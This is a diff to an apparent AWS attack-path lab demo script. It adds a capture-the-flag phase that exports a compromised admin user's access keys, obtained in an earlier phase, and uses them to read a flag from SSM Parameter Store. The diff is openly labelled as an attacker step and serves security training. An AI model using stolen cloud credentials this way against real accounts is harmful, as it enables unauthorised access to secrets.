@@ -983,6 +983,38 @@ fi
 echo ""
 
 # =============================================================================
+# Phase 11: Capture the Flag
+# =============================================================================
+echo -e "${BLUE}============================================================${NC}"
+echo -e "${BLUE}PHASE 11: Capture the Flag${NC}"
+echo -e "${BLUE}============================================================${NC}\n"
+
+echo -e "${YELLOW}The CTF flag is stored in SSM Parameter Store and is only readable by admins.${NC}"
+echo -e "${YELLOW}Using pl-prod-8min-frick's admin credentials to read it now.${NC}"
+echo ""
+
+# Frick's credentials are still active at this point (set in Phase 6)
+export AWS_ACCESS_KEY_ID="$FRICK_KEY_ID"
+export AWS_SECRET_ACCESS_KEY="$FRICK_SECRET_KEY"
+unset AWS_SESSION_TOKEN
+export AWS_REGION=$AWS_REGION
+
+show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws ssm get-parameter --region $AWS_REGION --name /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin --query Parameter.Value --output text"
+CTF_FLAG=$(aws ssm get-parameter \
+    --region $AWS_REGION \
+    --name /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin \
+    --query Parameter.Value \
+    --output text 2>/dev/null || echo "(flag not found)")
+
+echo ""
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}FLAG: $CTF_FLAG${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo ""
+
+ATTACK_COMMANDS+=("aws ssm get-parameter --region $AWS_REGION --name /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin --query Parameter.Value --output text")
+
+# =============================================================================
 # Final Summary
 # =============================================================================
 ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
